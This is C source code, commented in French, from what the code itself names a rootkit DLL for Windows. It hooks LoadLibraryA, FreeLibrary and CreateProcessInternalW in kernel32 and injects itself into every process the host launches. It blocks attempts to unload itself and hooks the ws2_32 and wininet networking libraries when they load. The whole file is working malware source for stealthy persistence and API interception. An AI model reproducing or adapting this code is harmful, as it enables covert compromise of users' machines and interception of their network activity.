#include <windows.h>
#include <stdio.h>

#include "hook_utils.h"
#include "ws2_32.h"
#include "server.h"
#include "wininet.h"


//Quelques données externes
extern char DLL_LOCATION[];
extern char DLL_NAME[];
extern char* debug_string[2049];


//Les infos pour les APIS injectées :
HMODULE  _stdcall NewLoadLibrary (LPCTSTR lpFileName);
char* backup_api_loadlibrary = NULL;

BOOL _stdcall NewFreeLibrary (HMODULE hModule);
char* backup_api_freelibrary = NULL;

BOOL _stdcall NewCreateProcessInternalW (DWORD unknown1, LPCTSTR lpApplicationName,	LPTSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,LPCTSTR lpCurrentDirectory,LPSTARTUPINFO lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation, DWORD unknown2);
char* backup_api_CreateProcessInternalW = NULL;





// -----------------------------------------------------------------------------------------------------------------------
// FONCTIONS PUBLIQUES : HOOK ET DEHOOK ----------------------------------------------------------------------------------
// -----------------------------------------------------------------------------------------------------------------------

int WINAPI hook_kernel32()
	{
		DWORD offset_new_fx;
				
		_snprintf((char*)debug_string,2048, "% 20s - kernel32.dll hook\n",GetNameByPID(GetCurrentProcessId()));
		send_debug ((char*)debug_string);

		// Hook de loadlibrary
		__asm lea eax,NewLoadLibrary
		__asm mov offset_new_fx,eax
		if (!backup_api_loadlibrary)
			initialise_hook("kernel32.dll","LoadLibraryA",offset_new_fx,&backup_api_loadlibrary);

		if (backup_api_loadlibrary)
		{
			_snprintf((char*)debug_string,2048, "% 20s - kernel32.dll:LoadLibraryA hook succes\n",GetNameByPID(GetCurrentProcessId()));
			send_debug ((char*)debug_string);
		}
		else
		{
			_snprintf((char*)debug_string,2048, "% 20s - kernel32.dll:LoadLibraryA hook echec\n",GetNameByPID(GetCurrentProcessId()));
			send_debug ((char*)debug_string);
		}
		
	
		// Hook de freelibrary
		__asm lea eax,NewFreeLibrary
		__asm mov offset_new_fx,eax
		if (!backup_api_freelibrary)
			initialise_hook("kernel32.dll","FreeLibrary",offset_new_fx,&backup_api_freelibrary);

		if (backup_api_freelibrary)
		{
			_snprintf((char*)debug_string,2048, "% 20s - kernel32.dll:FreeLibrary hook succes\n",GetNameByPID(GetCurrentProcessId()));
			send_debug ((char*)debug_string);
		}
		else
		{
			_snprintf((char*)debug_string,2048, "% 20s - kernel32.dll:FreeLibrary hook echec\n",GetNameByPID(GetCurrentProcessId()));
			send_debug ((char*)debug_string);
		}

		// Hook de CreateProcessInternalW
		__asm lea eax,NewCreateProcessInternalW
		__asm mov offset_new_fx,eax
		if (!backup_api_CreateProcessInternalW)
			initialise_hook("kernel32.dll","CreateProcessInternalW",offset_new_fx,&backup_api_CreateProcessInternalW);
		
		if (backup_api_CreateProcessInternalW)
		{
			_snprintf((char*)debug_string,2048, "% 20s - kernel32.dll:CreateProcessInternalW hook succes\n",GetNameByPID(GetCurrentProcessId()));
			send_debug ((char*)debug_string);
		}
		else
		{
			_snprintf((char*)debug_string,2048, "% 20s - kernel32.dll:CreateProcessInternalW hook echec\n",GetNameByPID(GetCurrentProcessId()));
			send_debug ((char*)debug_string);
		}
		
		// Fin	
		return TRUE;
	}
	
	
	
	
int WINAPI free_kernel32 ()
	{
		_snprintf((char*)debug_string,2048, "% 20s - kernel32.dll libération\n",GetNameByPID(GetCurrentProcessId()));
		send_debug ((char*)debug_string);

		if (backup_api_loadlibrary)
			enleve_hook("kernel32.dll","LoadLibraryA",&backup_api_loadlibrary);
			
		if (backup_api_freelibrary)
			enleve_hook("kernel32.dll","FreeLibrary",&backup_api_freelibrary);

		if (backup_api_CreateProcessInternalW)
			enleve_hook("kernel32.dll","CreateProcessInternalW",&backup_api_CreateProcessInternalW);

		// Fin
		return TRUE;
	}






// -----------------------------------------------------------------------------------------------------------------------
// FONCTIONS PRIVEES : NOUVEAUX HANDLERS ---------------------------------------------------------------------------------
// -----------------------------------------------------------------------------------------------------------------------

// Nouveau handler pour CreateProcessInternalW
BOOL _stdcall NewCreateProcessInternalW (DWORD unknown1, LPCTSTR lpApplicationName,LPTSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,LPCTSTR lpCurrentDirectory,LPSTARTUPINFO lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation, DWORD unknown2)
	{
		BOOL return_val;
		char nom_proggy [1024];
		int bibi = 0;

		// Récupère la ligne de commande qui va etre lancée
		memset (nom_proggy,0,1024);
		strcpy(nom_proggy,"unknown");
		if (lpCommandLine)
		{
			bibi = wide_to_ascii( (char*)lpCommandLine, nom_proggy, 1024);
			if (!bibi)
				strcpy(nom_proggy,"unknown");
		}
		
		// Ancien appel
		__asm
		{
			push dword ptr [ebp+34h]
			push dword ptr [ebp+30h]
			push dword ptr [ebp+2Ch]
			push dword ptr [ebp+28h]
			push dword ptr [ebp+24h]
			push dword ptr [ebp+20h]
			push dword ptr [ebp+1Ch]
			push dword ptr [ebp+18h]
			push dword ptr [ebp+14h]
			push dword ptr [ebp+10h]
			push dword ptr [ebp+0Ch]
			push dword ptr [ebp+8]

			call backup_api_CreateProcessInternalW
			mov return_val,eax
		}

		//Affiche la chaine de debug
		_snprintf((char*)debug_string,2048, "% 20s - appel à CreateProcessInternalW -> %i:%s\n",GetNameByPID(GetCurrentProcessId()), lpProcessInformation->dwProcessId, nom_proggy);
		send_debug ((char*)debug_string);
			
		// Injecte le processus créé
		injector (lpProcessInformation->dwProcessId, DLL_LOCATION);
			
		// Fin
		return return_val;
	}


// LOADLIBRARY
HMODULE  _stdcall NewLoadLibrary (LPCTSTR lpFileName)
	{
		HMODULE return_val;

		_snprintf( (char*)debug_string,2048, "% 20s - appel à LoadLibraryA -> %s\n",GetNameByPID(GetCurrentProcessId()), lpFileName);
		send_debug ((char*)debug_string);


		// Ancien appel
		__asm
		{
			push dword ptr [ebp+8]
			call backup_api_loadlibrary
			mov return_val,eax
		}

		// Si on a chargné des DLLs à hooker, ACTION !
		if (stricmp(lpFileName,"ws2_32.dll") == 0)
			hook_ws2_32();

		if (stricmp(lpFileName,"wininet.dll") == 0)
			hook_wininet();

	
		// Fin
		return return_val;
	}

		

		
// Nouveau handler pour FREELIBRARY
BOOL _stdcall NewFreeLibrary (HMODULE hModule)
	{
		int return_val;

		// Si tentative de virer le rootkit : ne le vire pas
		if ( hModule == GetModuleHandle(DLL_NAME))
		{
			_snprintf((char*)debug_string,2048, "% 20s - appel à FreeLibrary -> rootkit.dll\n",GetNameByPID(GetCurrentProcessId()));
			send_debug ((char*)debug_string);
			return 0;
		}
				
		// Si on vire une DLL hookée, nettoyage avant
		else if ( hModule == GetModuleHandle("ws2_32.dll"))
		{
			_snprintf((char*)debug_string,2048, "% 20s - appel à FreeLibrary -> ws2_32.dll\n",GetNameByPID(GetCurrentProcessId()));
			send_debug ((char*)debug_string);
			free_ws2_32();
		}
		else if ( hModule == GetModuleHandle("wininet.dll"))
		{
			_snprintf((char*)debug_string,2048, "% 20s - appel à FreeLibrary -> wininet.dll\n",GetNameByPID(GetCurrentProcessId()));
			send_debug ((char*)debug_string);
			free_wininet();
		}
		else
		{
			_snprintf((char*)debug_string,2048, "% 20s - appel à FreeLibrary -> ?\n",GetNameByPID(GetCurrentProcessId()));
			send_debug ((char*)debug_string);
		}

		
		// Ancien appel
		__asm
		{
			push dword ptr [ebp+8]
			call backup_api_freelibrary
			mov return_val,eax
		}
		
		// Fin
		return return_val;
	}
	
	
		
	

